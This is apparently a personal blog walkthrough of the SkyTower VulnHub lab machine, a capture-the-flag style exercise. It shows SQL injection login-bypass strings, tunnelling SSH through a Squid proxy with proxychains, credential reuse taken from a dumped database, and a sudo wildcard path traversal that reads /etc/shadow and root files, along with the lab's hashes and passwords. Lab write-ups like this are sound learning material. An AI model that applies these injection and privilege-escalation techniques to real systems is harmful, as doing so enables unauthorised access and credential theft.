---
layout: post
title: Air Divers
date: 20-04-2025
categories: [Basics, hack]
tags: [hack, blind, commandinjection, wget]
image: "https://images.theconversation.com/files/578175/original/file-20240227-28-cejldv.jpg?ixlib=rb-4.1.0&rect=0%2C0%2C7668%2C3828&q=45&auto=format&w=1356&h=668&fit=crop"
---



> You have to turn Off your electronic devices as we take off.
{: .prompt-danger }

## POrts
```
80 and 3128

```


## Bypass the loigin page
```
itried using various simple login and it seams to have sql injection vulnurability

'--  #this wa noithing out
'#   #this game mysql erro !Wow now # this its my comment

'-''# >> gave me the credentials


```
``'---#`` after try this Wow! lovely wow i get the credentials of ssh usernasme john.

## Manual driver on auto
> Sql injection we need to dive manually before automatically to get real dive in air.
{: .prompt-danger }

![Screenshot From 2025-03-29 04-25-28](https://github.com/user-attachments/assets/257533fb-ecd8-40a5-9d66-927884b01d83)
![Screenshot From 2025-03-29 04-25-34](https://github.com/user-attachments/assets/fb899670-c013-4a83-91d9-b66b545cfd79)

![Screenshot From 2025-03-29 04-26-05](https://github.com/user-attachments/assets/5f6f09c7-8d50-4278-9c58-c2eec5625ecc)

### Credentials

![Screenshot From 2025-03-29 04-26-14](https://github.com/user-attachments/assets/eea6609c-4a1a-4c80-ac31-937eb396c948)


```

Welcome john@skytech.com

As you may know, SkyTech has ceased all international operations.

To all our long term employees, we wish to convey our thanks for your dedication and hard work.

Unfortunately, all international contracts, including yours have been terminated.

The remainder of your contract and retirement fund, $2 ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.

Username: john
Password: hereisjohn

We wish you the best of luck in your future endeavors.
```

- now i have the domain name from the email
> we can try authentication
{: .prompt-tip }

![3-s2 0-B9780128199046000207-f20-07-9780128199046](https://github.com/user-attachments/assets/59cd3ef5-1ccc-4b56-944d-ca981bfd3bfd)


## Initial access
- icant see port 22 is closed but you can see port with the proxy, i think this one i tried to use proxychains to access.

```
I uncommented 

>>> dynamic_chain

after the uncommented i added, at the button and i commneted the socksproxyto no confusion on proxy proxylists.

>>> http 192.168.56.101 3128

```

![Screenshot From 2025-03-29 04-27-50](https://github.com/user-attachments/assets/17b2be6a-252d-4614-a293-6032880cba34)


##Login using ssh
```
                                                                                   
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
└─$ proxychains ssh -tt -oHostKeyAlgorithms=+ssh-rsa john@192.168.56.101

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK
john@192.168.56.101's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 29 03:32:32 2025 from 192.168.56.101

Funds have been withdrawn
Connection to 192.168.56.101 closed.
                                                                                   
```

how can i cry cant get the access direct Oops i have to use chat GPT to give me the reason i try to execute the command and see if i can gain the execution

```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
└─$ proxychains ssh -oHostKeyAlgorithms=+ssh-rsa john@192.168.56.101 "id; whoami; echo \$SHELL"

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK
john@192.168.56.101's password: 
uid=1000(john) gid=1000(john) groups=1000(john)
john
/bin/bash

```

for multiple testing and chatgpt game this and loged me sucessfully

```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
└─$ proxychains ssh -oHostKeyAlgorithms=+ssh-rsa john@192.168.56.101 -t "bash --noprofile --norc"

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK
john@192.168.56.101's password: 
bash-4.2$ 

```
	HAPPY HAPPY HAPPY

## Enumaration

#indentfying the users by cat the /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
john:x:1000:1000:john,,,:/home/john:/bin/bash
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash
bash-4.2$ 



```

## Lateral movement
under config file i can see the password and username of the database;
```
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

if($db->connect_errno > 0){
    die('Unable to connect to database [' . $db->connect_error . ']');

}



```
lets try and try to spray the passwords

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

mysql> use skytech
ERROR 1049 (42000): Unknown database 'skytech'
mysql> use SkyTech;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
3 rows in set (0.00 sec)

mysql> 


```

##spray the password of sara in ssh successed
```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
└─$ proxychains ssh -oHostKeyAlgorithms=+ssh-rsa sara@192.168.56.101 -t "bash --noprofile --norc"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK
sara@192.168.56.101's password: 
bash-4.2$ whoami
sara
bash-4.2$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
bash-4.2$ 


```
#It took me long time to see the rtechnique, the permistion it says
 io can go in /accounts/ as root and any other point so i need to pass first into /accounts/ as root and i can go * [ALL] i want so, i listed in root using /accounts/../root >> i go back one step and list the root directory contesnt and i found the flag
#WTF

## Privillage escalation
How can i prove can i cat /etc/shadow?
```
bash-4.2$ sudo cat /accounts/../etc/shadow
root:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:16241:0:99999:7:::
daemon:*:16241:0:99999:7:::
bin:*:16241:0:99999:7:::
sys:*:16241:0:99999:7:::
sync:*:16241:0:99999:7:::
games:*:16241:0:99999:7:::
man:*:16241:0:99999:7:::
lp:*:16241:0:99999:7:::
mail:*:16241:0:99999:7:::
news:*:16241:0:99999:7:::
uucp:*:16241:0:99999:7:::
proxy:*:16241:0:99999:7:::
www-data:*:16241:0:99999:7:::
backup:*:16241:0:99999:7:::
list:*:16241:0:99999:7:::
irc:*:16241:0:99999:7:::
gnats:*:16241:0:99999:7:::
nobody:*:16241:0:99999:7:::
libuuid:!:16241:0:99999:7:::
sshd:*:16241:0:99999:7:::
mysql:!:16241:0:99999:7:::
john:$6$a39powbs$ditVKZ1waa6vJEh3BG1d5jLv/uADKcl.r1kcA.XKyhNfJoiDhSdwmSZel3V5cZ/S6ec3wd8rdNA2dOznTXhl0/:16198:0:99999:7:::
sara:$6$2PvpHNG0$hbaMRd5fZhWMDHyyhGHINSy.qBHnvP4QW1k9RSwv.pQM6SoZey53C7S7aF6263ae6qx5TwVA6sahf5tebUqvY1:16198:0:99999:7:::
william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn9.HyxjKhSVji8/CzHNFLit3GU1:16241:0:99999:7:::


```
#let mee if root has any thing

```

bash-4.2$ sudo ls /accounts/../roots
ls: cannot access /accounts/../roots: No such file or directory
bash-4.2$ sudo ls /accounts/../root
flag.txt
bash-4.2$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
bash-4.2$ 


```
#wow i have root password now i can go more
```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
└─$ proxychains ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.56.101 -t "bash --noprofile --norc"

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  192.168.56.101:3128  ...  192.168.56.101:22  ...  OK
root@192.168.56.101's password: 
bash-4.2# whoami
root
bash-4.2# 
bash-4.2# cat /etc/shadow
root:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:16241:0:99999:7:::
daemon:*:16241:0:99999:7:::
bin:*:16241:0:99999:7:::
sys:*:16241:0:99999:7:::
sync:*:16241:0:99999:7:::
games:*:16241:0:99999:7:::
man:*:16241:0:99999:7:::
lp:*:16241:0:99999:7:::
mail:*:16241:0:99999:7:::
news:*:16241:0:99999:7:::
uucp:*:16241:0:99999:7:::
proxy:*:16241:0:99999:7:::
www-data:*:16241:0:99999:7:::
backup:*:16241:0:99999:7:::
list:*:16241:0:99999:7:::
irc:*:16241:0:99999:7:::
gnats:*:16241:0:99999:7:::
nobody:*:16241:0:99999:7:::
libuuid:!:16241:0:99999:7:::
sshd:*:16241:0:99999:7:::
mysql:!:16241:0:99999:7:::
john:$6$a39powbs$ditVKZ1waa6vJEh3BG1d5jLv/uADKcl.r1kcA.XKyhNfJoiDhSdwmSZel3V5cZ/S6ec3wd8rdNA2dOznTXhl0/:16198:0:99999:7:::
sara:$6$2PvpHNG0$hbaMRd5fZhWMDHyyhGHINSy.qBHnvP4QW1k9RSwv.pQM6SoZey53C7S7aF6263ae6qx5TwVA6sahf5tebUqvY1:16198:0:99999:7:::
william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn9.HyxjKhSVji8/CzHNFLit3GU1:16241:0:99999:7:::
bash-4.2# 


```
> Ooops! It manager is comming
{: .prompt-danger }


![Screenshot From 2025-03-29 04-28-40](https://github.com/user-attachments/assets/0c6ff2af-b169-4171-8e49-5fe5939e9c02)


Good bye...!
